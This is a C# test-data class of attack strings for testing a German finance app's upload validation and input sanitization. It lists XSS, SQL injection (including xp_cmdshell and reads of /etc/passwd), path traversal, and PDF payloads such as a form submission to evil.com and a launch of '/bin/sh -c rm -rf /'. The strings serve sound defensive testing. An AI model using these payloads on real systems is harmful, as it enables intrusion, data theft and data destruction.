using System.Text;

namespace FinanceApp.Tests.TestData;

/// <summary>
/// Security test data for comprehensive testing of FileValidationService and InputSanitizationService
/// 
/// Contains various malicious payloads, attack vectors, and edge cases for security testing:
/// - XSS payloads (basic, advanced, encoded, obfuscated)
/// - SQL injection patterns (classic, advanced, blind)
/// - PDF malicious content patterns (JavaScript, launch actions, embedded files)
/// - Path traversal attempts and file name attacks
/// - German-specific content with security considerations
/// 
/// German BWA Context:
/// Includes legitimate German business terms and financial data formats
/// that should pass security validation while blocking malicious content
/// </summary>
public static class SecurityTestData
{
    #region XSS Attack Payloads

    /// <summary>
    /// Basic XSS payloads for testing script injection detection
    /// </summary>
    public static readonly string[] BasicXssPayloads = new[]
    {
        "<script>alert('xss')</script>",
        "<SCRIPT>ALERT('XSS')</SCRIPT>",
        "<script>alert(\"xss\")</script>",
        "<script>alert(`xss`)</script>",
        "<script>eval('alert(1)')</script>",
        "<script>window.location='http://evil.com'</script>",
        "<script>document.cookie='stolen'</script>"
    };

    /// <summary>
    /// Advanced XSS payloads including event handlers and other vectors
    /// </summary>
    public static readonly string[] AdvancedXssPayloads = new[]
    {
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('xss')>",
        "<input type='text' onmouseover='alert(1)'>",
        "<div onclick='alert(\"xss\")'>Click me</div>",
        "<a href='javascript:alert(1)'>Link</a>",
        "<form action='javascript:alert(1)'><input type=submit>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>"
    };

    /// <summary>
    /// Encoded XSS payloads to test decoding detection
    /// </summary>
    public static readonly string[] EncodedXssPayloads = new[]
    {
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert('xss')\\u003c/script\\u003e",
        "&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;"
    };

    /// <summary>
    /// Obfuscated and bypass attempts
    /// </summary>
    public static readonly string[] ObfuscatedXssPayloads = new[]
    {
        "<scr<script>ipt>alert('xss')</scr</script>ipt>",
        "<<SCRIPT>alert('xss')//<</SCRIPT>",
        "<script>\\x61lert('xss')</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    };

    #endregion

    #region SQL Injection Payloads

    /// <summary>
    /// Classic SQL injection patterns
    /// </summary>
    public static readonly string[] SqlInjectionPayloads = new[]
    {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "' OR 1=1#",
        "') OR ('1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
    };

    /// <summary>
    /// Advanced SQL injection techniques
    /// </summary>
    public static readonly string[] AdvancedSqlPayloads = new[]
    {
        "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) > 65 --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "'; WAITFOR DELAY '00:00:05' --",
        "' UNION SELECT load_file('/etc/passwd') --"
    };

    /// <summary>
    /// Blind SQL injection patterns
    /// </summary>
    public static readonly string[] BlindSqlPayloads = new[]
    {
        "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
        "' AND (SELECT COUNT(*) FROM users) = 1 --",
        "' AND 1=(SELECT COUNT(*) FROM tablenames) --",
        "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --"
    };

    #endregion

    #region PDF Malicious Content Patterns

    /// <summary>
    /// JavaScript patterns in PDF files
    /// </summary>
    public static readonly string[] PdfJavaScriptPatterns = new[]
    {
        "/JavaScript (this.print({bUI:true,bSilent:false,bShrinkToFit:true});)",
        "/JS (app.alert('Malicious JavaScript executed');)",
        "/JavaScript (this.submitForm('http://evil.com/steal.php');)",
        "/JS (this.exportDataObject({ cName: 'attachment', nLaunch: 2 });)",
        "/JavaScript (util.printf('%45000c', 'overflow');)",
        "/JS (app.launchURL('http://malicious-site.com', true);)"
    };

    /// <summary>
    /// Launch action patterns in PDF files
    /// </summary>
    public static readonly string[] PdfLaunchPatterns = new[]
    {
        "/Launch << /F (cmd.exe) /P (calc.exe) >>",
        "/Action << /S /Launch /F (powershell.exe) >>",
        "/Launch << /F (/bin/sh) /P (-c 'rm -rf /') >>",
        "/Action << /S /Launch /F (notepad.exe) /P (C:\\\\temp\\\\malware.exe) >>",
        "/Launch << /F (C:\\\\Windows\\\\System32\\\\cmd.exe) >>"
    };

    /// <summary>
    /// Embedded file patterns in PDF files
    /// </summary>
    public static readonly string[] PdfEmbeddedPatterns = new[]
    {
        "/EmbeddedFile << /Length 1234 /Filter /FlateDecode >>",
        "/FileAttachment << /F (malware.exe) /Type /Filespec >>",
        "/EmbeddedFile << /Subtype /application#2Foctet-stream >>",
        "/FileAttachment << /F (virus.scr) /UF (document.pdf) >>",
        "/EmbeddedFile << /Length 999999 /Filter /ASCIIHexDecode >>"
    };

    #endregion

    #region Path Traversal Attempts

    /// <summary>
    /// Directory traversal patterns
    /// </summary>
    public static readonly string[] PathTraversalPatterns = new[]
    {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "\\..\\..\\..\\etc\\passwd",
        "file:///etc/passwd",
        "file:///c:/windows/system32/drivers/etc/hosts"
    };

    /// <summary>
    /// Malicious file names for testing file upload security
    /// </summary>
    public static readonly string[] MaliciousFileNames = new[]
    {
        "document.pdf.exe",
        "innocent.pdf\0.exe",
        "file<script>alert(1)</script>.pdf",
        "file>redirect.pdf",
        "file|pipe.pdf",
        "file:stream.pdf",
        "file?query=malicious.pdf",
        "file*wildcard*.pdf",
        "CON.pdf", // Reserved Windows name
        "PRN.pdf", // Reserved Windows name
        "AUX.pdf", // Reserved Windows name
        "document.pdf%20.exe",
        ".htaccess.pdf",
        "web.config.pdf"
    };

    #endregion

    #region German Business Data (Legitimate)

    /// <summary>
    /// Legitimate German BWA categories that should pass validation
    /// </summary>
    public static readonly string[] ValidGermanBwaCategories = new[]
    {
        "Umsatzerlöse",
        "Personalkosten",
        "Raumkosten",
        "Abschreibungen auf Sachanlagen",
        "Sonstige betriebliche Aufwendungen",
        "Zinsen und ähnliche Aufwendungen",
        "Steuern vom Einkommen und Ertrag",
        "Bürokosten",
        "Werbekosten",
        "Reisekosten",
        "Kfz-Kosten",
        "Versicherungen",
        "Reparatur und Instandhaltung",
        "Beratungskosten",
        "4000 Umsatzerlöse",
        "6200 Raumkosten",
        "6300 Bürokosten"
    };

    /// <summary>
    /// German financial data with special characters and formatting
    /// </summary>
    public static readonly string[] ValidGermanFinancialData = new[]
    {
        "Geschäftsführung",
        "Prüfungskosten",
        "Büroausstattung",
        "Müller & Söhne GmbH",
        "Straße 123, München",
        "1.234,56 €",
        "€ 15.000,75",
        "Kosten für Geschäftsführung",
        "Betriebsausgaben laut BWA",
        "Jahresübersicht 2023"
    };

    /// <summary>
    /// Valid German file names that should pass sanitization
    /// </summary>
    public static readonly string[] ValidGermanFileNames = new[]
    {
        "BWA-Jahresübersicht-2023.pdf",
        "Geschäftsbericht-2023.pdf",
        "Prüfungsbericht-Müller-GmbH.pdf",
        "Betriebsauswertung-Q4-2023.pdf",
        "Steuerliche-Auswertung-2023.pdf",
        "Kostenanalyse-Bürokosten.pdf",
        "Umsatzanalyse-Quartal-4.pdf"
    };

    #endregion

    #region Mixed Attack Vectors

    /// <summary>
    /// Combined attack patterns mixing different techniques
    /// </summary>
    public static readonly string[] MixedAttackVectors = new[]
    {
        "Normal text <script>alert('xss')</script> and '; DROP TABLE users; --",
        "../../../etc/passwd<script>alert(1)</script>",
        "<img src=x onerror=alert('xss')>'; UNION SELECT password FROM users --",
        "Umsatzerlöse<script>steal()</script>", // German term with XSS
        "BWA'; DROP DATABASE finance; --<iframe src=javascript:alert(1)>",
        "%3Cscript%3E../../etc/passwd%3C/script%3E"
    };

    /// <summary>
    /// Edge case inputs that might cause parsing issues
    /// </summary>
    public static readonly string[] EdgeCaseInputs = new[]
    {
        new string('\0', 100), // Null bytes
        new string((char)0x200B, 50), // Zero-width spaces
        new string((char)0xFFFF, 10), // High Unicode
        "\x1B[2J\x1B[H", // ANSI escape sequences
        "\\x00\\x01\\x02\\x03", // Escaped null bytes
        "🔒🚨💻🔓", // Emoji characters
        "∑∞π∆", // Mathematical symbols
        "test\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>" // HTTP header injection
    };

    #endregion

    #region Test PDF Content Generators

    /// <summary>
    /// Creates a malicious PDF content with embedded JavaScript
    /// </summary>
    public static string CreateMaliciousPdfWithJavaScript(string jsPayload)
    {
        return $@"%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
{jsPayload}
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/ProcSet [/PDF /Text]
>>
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
72 720 Td
(Malicious PDF) Tj
ET
endstream
endobj
%%EOF";
    }

    /// <summary>
    /// Creates a legitimate German BWA PDF content
    /// </summary>
    public static string CreateLegitimateGermanBwaPdf()
    {
        return @"%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/ProcSet [/PDF /Text]
>>
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 250
>>
stream
BT
/F1 12 Tf
72 720 Td
(Jahresübersicht 2023) Tj
0 -20 Td
(Geschäftsführung: Müller & Söhne GmbH) Tj
0 -20 Td
(Umsatzerlöse: 125.000,50 €) Tj
0 -20 Td
(Personalkosten: -45.000,00 €) Tj
0 -20 Td
(Raumkosten: -12.500,25 €) Tj
0 -20 Td
(Betriebsergebnis: 67.500,25 €) Tj
ET
endstream
endobj
%%EOF";
    }

    /// <summary>
    /// Creates PDF content with launch actions
    /// </summary>
    public static string CreatePdfWithLaunchAction(string launchPayload)
    {
        return $@"%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
{launchPayload}
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
%%EOF";
    }

    #endregion

    #region Utility Methods

    /// <summary>
    /// Converts string content to byte array for PDF testing
    /// </summary>
    public static byte[] StringToBytes(string content)
    {
        return Encoding.UTF8.GetBytes(content);
    }

    /// <summary>
    /// Creates valid PDF magic bytes for testing
    /// </summary>
    public static byte[] CreateValidPdfMagicBytes()
    {
        return new byte[] { 0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34 }; // %PDF-1.4
    }

    /// <summary>
    /// Creates invalid magic bytes (PNG signature) for testing
    /// </summary>
    public static byte[] CreateInvalidMagicBytes()
    {
        return new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }; // PNG signature
    }

    #endregion
}